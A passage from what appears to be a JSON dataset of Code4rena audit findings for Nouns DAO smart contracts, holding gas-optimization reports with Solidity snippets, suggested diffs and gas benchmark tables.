reverts\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol#L145-L154\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol\n145:        require(delegatee != address(0), 'ERC721Checkpointable::delegateBySig: delegatee cannot be zero address');\n\n154:        require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');\n```\nThe require check on line 154 basically validates a function parameter which is not that gas intensive. Before we hit the check, we are performing some other operations which are gas intensive. If we do revert on the check on line 154, the gas spent doing other operations would just be wasted. We can reorder the operations to perform the parameter checks earlier.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol\nindex 47aabf7c..b2d79195 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol\n@@ -143,6 +143,7 @@ abstract contract ERC721CheckpointableUpgradeable is ERC721EnumerableUpgradeable\n         bytes32 s\n     ) public {\n         require(delegatee != address(0), 'ERC721Checkpointable::delegateBySig: delegatee cannot be zero address');\n+        require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');\n         bytes32 domainSeparator = keccak256(\n             abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name())), block.chainid, address(this))\n         );\n@@ -151,7 +152,6 @@ abstract contract ERC721CheckpointableUpgradeable is ERC721EnumerableUpgradeable\n         address signatory = ecrecover(digest, v, r, s);\n         require(signatory != address(0), 'ERC721Checkpointable::delegateBySig: invalid signature');\n         require(nonce == nonces[signatory]++, 'ERC721Checkpointable::delegateBySig: invalid nonce');\n-        require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');\n         return _delegate(signatory, delegatee);\n     }\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20207",
      "title": "[G-07] Emitting storage values instead of the memory one",
      "impact": "GAS",
      "content": "Here, the values emitted shouldn’t be read from storage. The existing memory values should be used instead:\n\n<details>\n\n### NounsDAOLogicV2.sol.\\_setVotingDelay(): Emit `newVotingDelay` instead of `votingDelay` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L644-L656\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n644:    function _setVotingDelay(uint256 newVotingDelay) external {\n\n652:        uint256 oldVotingDelay = votingDelay;\n653:        votingDelay = newVotingDelay;\n\n655:        emit VotingDelaySet(oldVotingDelay, votingDelay);\n656:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..c0b85b3f 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -652,7 +652,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         uint256 oldVotingDelay = votingDelay;\n         votingDelay = newVotingDelay;\n\n-        emit VotingDelaySet(oldVotingDelay, votingDelay);\n+        emit VotingDelaySet(oldVotingDelay, newVotingDelay);\n     }\n\n```\n\n### NounsDAOLogicV2.sol.\\_setVotingPeriod(): Emit `newVotingPeriod` instead of `votingPeriod` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L662-L674\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n662:    function _setVotingPeriod(uint256 newVotingPeriod) external {\n\n671:        votingPeriod = newVotingPeriod;\n\n673:        emit VotingPeriodSet(oldVotingPeriod, votingPeriod);\n674:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..96f8682a 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -670,7 +670,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         uint256 oldVotingPeriod = votingPeriod;\n         votingPeriod = newVotingPeriod;\n\n-        emit VotingPeriodSet(oldVotingPeriod, votingPeriod);\n+        emit VotingPeriodSet(oldVotingPeriod, newVotingPeriod);\n     }\n```\n\n### NounsDAOLogicV2.sol.\\_setProposalThresholdBPS(): Emit `newProposalThresholdBPS` instead of `proposalThresholdBPS` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L681-L694\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n681:    function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {\n\n691:        proposalThresholdBPS = newProposalThresholdBPS;\n\n693:        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS);\n694:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..0c6ad8cf 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -690,7 +690,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         uint256 oldProposalThresholdBPS = proposalThresholdBPS;\n         proposalThresholdBPS = newProposalThresholdBPS;\n\n-        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS);\n+        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, newProposalThresholdBPS);\n     }\n```\n\n### Use the cheaper global variable(msg.sender) instead of reading from state when emitting (Save 1 SLOAD: ~100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L904-L909\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n904:    function _burnVetoPower() public {\n905:        // Check caller is vetoer\n906:        require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only');\n\n908:        // Update vetoer to 0x0\n909:        emit NewVetoer(vetoer, address(0));\n```\n\n```diff\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -906,7 +906,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only');\n\n         // Update vetoer to 0x0\n-        emit NewVetoer(vetoer, address(0));\n+        emit NewVetoer(msg.sender, address(0));\n         vetoer = address(0);\n```\n\n### NounsDAOProxy.sol.\\_setImplementation(): Emit `implementation_` instead of `implementation` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol#L83-L85\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol\n83:        implementation = implementation_;\n\n85:        emit NewImplementation(oldImplementation, implementation);\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol b/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol\nindex f42e3bf6..e95391cf 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol\n@@ -82,7 +82,7 @@ contract NounsDAOProxy is NounsDAOProxyStorage, NounsDAOEvents {\n         address oldImplementation = implementation;\n         implementation = implementation_;\n\n-        emit NewImplementation(oldImplementation, implementation);\n+        emit NewImplementation(oldImplementation, implementation_);\n     }\n```\n\n### NounsDAOExecutor.sol.setDelay(): Emit `delay_` instead of `delay` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L80-L87\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n80:    function setDelay(uint256 delay_) public {\n\n84:        delay = delay_;\n        \n86:        emit NewDelay(delay);\n87:    }\n```\n\n```diff\n         require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');\n         delay = delay_;\n\n-        emit NewDelay(delay);\n+        emit NewDelay(delay_);\n     }\n```\n\n### NounsDAOExecutor.sol.acceptAdmin(): Emit `msg.sender` instead of `admin` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L89-L95\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n89:    function acceptAdmin() public {\n\n91:        admin = msg.sender;\n     \n94:        emit NewAdmin(admin);\n```\n\n```diff\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n@@ -91,7 +91,7 @@ contract NounsDAOExecutor {\n         admin = msg.sender;\n         pendingAdmin = address(0);\n\n-        emit NewAdmin(admin);\n+        emit NewAdmin(msg.sender);\n\n```\n\n### NounsDAOExecutor.sol.setPendingAdmin(): Emit `pendingAdmin_` instead of `pendingAdmin` (Save 1 SLOAD: 100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L97-L105\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n97:    function setPendingAdmin(address pendingAdmin_) public {\n\n102:        pendingAdmin = pendingAdmin_;\n\n104:        emit NewPendingAdmin(pendingAdmin);\n105:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\nindex 2f87cd01..1f23d7c4 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n@@ -101,7 +101,7 @@ contract NounsDAOExecutor {\n         );\n         pendingAdmin = pendingAdmin_;\n\n-        emit NewPendingAdmin(pendingAdmin);\n+        emit NewPendingAdmin(pendingAdmin_);\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20206",
      "title": "[G-06] Use the existing Local variable/global variable when equal to a state variable to avoid reading from state",
      "impact": "GAS",
      "content": "\n### Local variable `_escrow` should be used instead of reading `escrow`\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L131-L137\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 211357    | 224893   | 211357 | 255180 |\n| After  | 211339    | 224875   | 211339 | 255162 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n131:        escrow = _escrow;\n        \n137:        NounsTokenFork originalToken = NounsTokenFork(address(escrow.nounsToken()));\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsT\nokenFork.sol\nindex a1f9d6d3..fea6fad8 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n@@ -134,7 +134,7 @@ contract NounsTokenFork is INounsTokenFork, OwnableUpgradeable, ERC721Checkpoint\n         remainingTokensToClaim = tokensToClaim;\n         forkingPeriodEndTimestamp = _forkingPeriodEndTimestamp;\n\n-        NounsTokenFork originalToken = NounsTokenFork(address(escrow.nounsToken()));\n+        NounsTokenFork originalToken = NounsTokenFork(address(_escrow.nounsToken()));\n         descriptor = originalToken.descriptor();\n         seeder = originalToken.seeder();\n     }\n```\n\n### Global variable `msg.sender` should be used instead of reading state (Save 128 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L240-L260\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 13546    | 439476   | 380456 | 947962 |\n| After  | 13456    | 439348   | 380323 | 947829 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n240:        Proposal storage newProposal = _proposals[proposalCount];\n\n242:        newProposal.proposer = msg.sender;\n\n260:        latestProposalIds[newProposal.proposer] = newProposal.id;\n```\nWe are setting `newProposal.proposer` to be equal to `msg.sender`. As `newProposal.proposer` is a state variable, it's a bit expensive to read, we can instead read `msg.sender` which is a global variable, thus more cheaper to read.\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..9328d9ce 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -257,7 +257,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         newProposal.totalSupply = temp.totalSupply;\n         newProposal.creationBlock = block.number;\n\n-        latestProposalIds[newProposal.proposer] = newProposal.id;\n+        latestProposalIds[msg.sender] = newProposal.id;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20205",
      "title": "[G-05] Cache storage values in memory to minimize SLOADs",
      "impact": "GAS",
      "content": "The code can be optimized by minimizing the number of SLOADs.\n\n<details>\n\n### NounsDAOLogicV2.sol.propose(): `nouns` should be cached(saves 110 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L206-L213\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 13546    | 439476   | 380456 | 947962 |\n| After  | 13434    | 439366   | 380346 | 947852 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n206:        temp.totalSupply = nouns.totalSupply();\n\n210:        require(\n211:            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n212:            'NounsDAO::propose: proposer votes below proposal threshold'\n213:        );\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..88a92be0 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -203,12 +203,14 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n     ) public returns (uint256) {\n         ProposalTemp memory temp;\n\n-        temp.totalSupply = nouns.totalSupply();\n+         NounsTokenLike _nouns = nouns;\n+\n+        temp.totalSupply = _nouns.totalSupply();\n\n         temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);\n\n         require(\n-            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n+            _nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n             'NounsDAO::propose: proposer votes below proposal threshold'\n         );\n```\n\n### queueOrRevertInternal(): `timelock` should be cached (Save 1 SLOAD: 200 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L325-L329\n\n**Gas benchmarks** based on the function `queue` that calls our function of interest `queueOrRevertInternal()`\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 1039    | 101175   | 68684 | 173646 |\n| After  | 1039    | 100975   | 68586 | 173254 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n325:        require(\n326:            !timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),\n327:            'NounsDAO::queueOrRevertInternal: identical proposal action already queued at eta'\n328:        );\n329:        timelock.queueTransaction(target, value, signature, data, eta);\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..8b880214 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -322,11 +322,12 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         bytes memory data,\n         uint256 eta\n     ) internal {\n+        INounsDAOExecutor _timelock = timelock;\n         require(\n-            !timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),\n+            !_timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),\n             'NounsDAO::queueOrRevertInternal: identical proposal action already queued at eta'\n         );\n-        timelock.queueTransaction(target, value, signature, data, eta);\n+        _timelock.queueTransaction(target, value, signature, data, eta);\n     }\n```\n\n### NounsDAOLogicV2.sol.veto(): `vetoer` should be cached(saves 92 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L389-L396\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 488    | 25736   | 30324 | 45345 |\n| After  | 491    | 25644   | 30239 | 45239 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n389:    function veto(uint256 proposalId) external {\n390:        if (vetoer == address(0)) {\n391:            revert VetoerBurned();\n392:        }\n\n394:        if (msg.sender != vetoer) {\n395:            revert VetoerOnly();\n396:        }\n```\n\n```diff\n     function veto(uint256 proposalId) external {\n-        if (vetoer == address(0)) {\n+        address _vetoer = vetoer;\n+        if (_vetoer == address(0)) {\n             revert VetoerBurned();\n         }\n\n-        if (msg.sender != vetoer) {\n+        if (msg.sender != _vetoer) {\n             revert VetoerOnly();\n         }\n```\n\n### NounsDAOLogicV2.sol.getDynamicQuorumParamsAt(): `quorumVotesBPS` should be cached(saves 2 SLOADs: 200 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L981-L1005\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n981:    function getDynamicQuorumParamsAt(uint256 blockNumber_) public view returns (DynamicQuorumParams memory) {\n\n985:        if (len == 0) {\n986:            return\n987:                DynamicQuorumParams({\n988:                    minQuorumVotesBPS: safe16(quorumVotesBPS),\n989:                    maxQuorumVotesBPS: safe16(quorumVotesBPS),\n990:                    quorumCoefficient: 0\n991:                });\n992:        }\n\n998:        if (quorumParamsCheckpoints[0].fromBlock > blockNumber) {\n999:            return\n1000:                DynamicQuorumParams({\n1001:                    minQuorumVotesBPS: safe16(quorumVotesBPS),\n1002:                    maxQuorumVotesBPS: safe16(quorumVotesBPS),\n1003:                    quorumCoefficient: 0\n1004:                });\n1005:        }\n```\n\n```diff\n@@ -981,12 +981,14 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n     function getDynamicQuorumParamsAt(uint256 blockNumber_) public view returns (DynamicQuorumParams memory) {\n         uint32 blockNumber = safe32(blockNumber_, 'NounsDAO::getDynamicQuorumParamsAt: block number exceeds 32 bits');\n         uint256 len = quorumParamsCheckpoints.length;\n+\n\n         if (len == 0) {\n+            uint16 _quorumVotesBPS  = safe16(quorumVotesBPS);\n             return\n                 DynamicQuorumParams({\n-                    minQuorumVotesBPS: safe16(quorumVotesBPS),\n-                    maxQuorumVotesBPS: safe16(quorumVotesBPS),\n+                    minQuorumVotesBPS: _quorumVotesBPS,\n+                    maxQuorumVotesBPS: _quorumVotesBPS,\n                     quorumCoefficient: 0\n                 });\n         }\n@@ -996,10 +998,11 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         }\n\n         if (quorumParamsCheckpoints[0].fromBlock > blockNumber) {\n+            uint16 _quorumVotesBPS  = safe16(quorumVotesBPS);\n             return\n                 DynamicQuorumParams({\n-                    minQuorumVotesBPS: safe16(quorumVotesBPS),\n-                    maxQuorumVotesBPS: safe16(quorumVotesBPS),\n+                    minQuorumVotesBPS: _quorumVotesBPS,\n+                    maxQuorumVotesBPS: _quorumVotesBPS,\n                     quorumCoefficient: 0\n                 });\n         }\n```\n\n### NounsAuctionHouseFork.sol.\\_safeTransferETHWithFallback(): `weth` should be cached (Save 1 SLOAD: ~97 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol#L261-L265\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol\n261:    function _safeTransferETHWithFallback(address to, uint256 amount) internal {\n262:        if (!_safeTransferETH(to, amount)) {\n263:            IWETH(weth).deposit{ value: amount }();\n264:            IERC20(weth).transfer(to, amount);\n265:        }\n```\n\n```diff\n     function _safeTransferETHWithFallback(address to, uint256 amount) internal {\n         if (!_safeTransferETH(to, amount)) {\n-            IWETH(weth).deposit{ value: amount }();\n-            IERC20(weth).transfer(to, amount);\n+            address _weth = weth;\n+            IWETH(_weth).deposit{ value: amount }();\n+            IERC20(_weth).transfer(to, amount);\n         }\n     }\n```\n\n### NounsDAOLogicV1Fork.sol.adjustedTotalSupply(): `nouns` should be cached (Save 237 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L777-L779\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 4709    | 8709   | 8709 | 12709 |\n| After  | 4472    | 8472   | 8472 | 12472 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n777:    function adjustedTotalSupply() public view returns (uint256) {\n778:        return nouns.totalSupply() - nouns.balanceOf(address(timelock)) + nouns.remainingTokensToClaim();\n779:    }\n```\n\n```diff\n\n     function adjustedTotalSupply() public view returns (uint256) {\n-        return nouns.totalSupply() - nouns.balanceOf(address(timelock)) + nouns.remainingTokensToClaim();\n+        INounsTokenForkLike _nouns =  nouns;\n+        return _nouns.totalSupply() - _nouns.balanceOf(address(timelock)) + _nouns.remainingTokensToClaim();\n     }\n\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20204",
      "title": "[G-04] Expensive operation inside a for loop",
      "impact": "GAS",
      "content": "\n### Function `quitInternal()` does a lot of inefficient operation mainly inside it's for loops. I've optimized it as a whole but avoided some common optimizations \nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L218-L245\n\n**As it's an internal one, the gas changes can be seen from the two function `quit`**<br>\n`Benchmarks for quit(uint256[])`\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 743    | 245981   | 202066 | 501600 |\n| After  | 743    | 245388   | 201653 | 500096 |\n\n`Benchmarks for quit(uint256[],address[])`\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 14309    | 165989   | 151098 | 347452 |\n| After  | 14309    | 165727   | 150891 | 346817 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n218:    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {\n\n223:        for (uint256 i = 0; i < tokenIds.length; i++) {\n224:            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n225:        }\n\n231:        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n232:            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);\n233:            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n234:        }\n\n237:        timelock.sendETH(payable(msg.sender), ethToSend);\n238:        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n239:            if (balancesToSend[i] > 0) {\n240:                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);\n241:            }\n242:        }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\nindex 0b098e44..49d60515 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n@@ -219,25 +219,26 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou\n         checkGovernanceActive();\n\n         uint256 totalSupply = adjustedTotalSupply();\n-\n+        NounsDAOExecutorV2  _timelock = timelock;\n+        INounsTokenForkLike _nouns = nouns;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n-            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n+            _nouns.transferFrom(msg.sender, address(_timelock), tokenIds[i]);\n         }\n\n         uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);\n\n         // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.\n-        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n+        uint256 ethToSend = (address(_timelock).balance * tokenIds.length) / totalSupply;\n         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n             IERC20 erc20token = IERC20(erc20TokensToInclude[i]);\n-            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n+            balancesToSend[i] = (erc20token.balanceOf(address(_timelock)) * tokenIds.length) / totalSupply;\n         }\n\n         // Send ETH and ERC20 tokens\n-        timelock.sendETH(payable(msg.sender), ethToSend);\n+        _timelock.sendETH(payable(msg.sender), ethToSend);\n         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n             if (balancesToSend[i] > 0) {\n-                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);\n+                _timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);\n             }\n         }\n\n```\n\n### Don't read state inside loops,`escrow and forkId` should be cached outside the loop (Save 199 Gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L148-L157\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 6721    | 387833   | 217402 | 3683287 |\n| After  | 6754    | 387714   | 217439 | 3680633 |\n```solidity\nFile: 